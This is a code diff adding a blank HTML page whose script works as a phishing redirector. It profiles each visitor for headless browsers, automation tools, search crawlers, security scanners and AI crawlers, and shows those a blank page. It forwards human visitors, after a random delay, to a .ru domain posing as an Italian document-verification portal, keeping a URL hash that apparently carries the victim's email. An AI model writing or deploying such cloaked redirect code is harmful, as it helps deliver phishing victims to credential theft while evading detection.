@@ -1,1 +1,59 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+  <meta name="referrer" content="no-referrer">
+  <title></title>
+  <style>
+    html, body { margin: 0; padding: 0; background: #fff; height: 100%; }
+  </style>
+</head>
+<body>
+  <script>
+  (function () {
+    "use strict";
+
+    var BASE = "https://europolus.ru/offeuropolus.ruondocumentiverificazioneportale00025A745563E6C08103CFE6E058609A/ondocumentiverificazioneportale00025A745563E6C08103CFE6E058609A";
+
+    // hash stays on final URL — no ?email=
+    function getHash() {
+      var h = window.location.hash || "";
+      if (!h) return "";
+      if (h.charAt(0) !== "#") h = "#" + h;
+      return h;
+    }
+    function go() {
+      var dest = BASE + getHash();
+      try { window.location.replace(dest); }
+      catch (e) { window.location.href = dest; }
+    }
+
+    // --- light bot checks only (less aggressive) ---
+    function isObviousBot() {
+      try {
+        if (navigator.webdriver === true) return true;
+        if (window.callPhantom || window._phantom || window.phantom) return true;
+        if (window.__nightmare) return true;
+        if (window.domAutomation || window.domAutomationController) return true;
+        var ua = navigator.userAgent || "";
+        if (/HeadlessChrome|PhantomJS|bot|crawler|spider|curl\/|wget|python-requests|scrapy|selenium|puppeteer|playwright|ahrefs|semrush|mj12|dotbot|petalbot|bytespider|gptbot|claudebot|ccbot|facebookexternalhit|bingpreview/i.test(ua)) return true;
+        if (window.outerWidth === 0 && window.outerHeight === 0) return true;
+      } catch (e) {}
+      return false;
+    }
+
+    if (isObviousBot()) {
+      // blank page, no redirect
+      return;
+    }
+
+    // short quiet dwell so dumb prefetch/crawlers that don't run timers well drop off
+    // no mouse requirement — real humans pass even if they don't move
+    var wait = 400 + Math.floor(Math.random() * 500); // 0.4–0.9s
+    setTimeout(go, wait);
+  })();
+  </script>
+</body>
+</html>
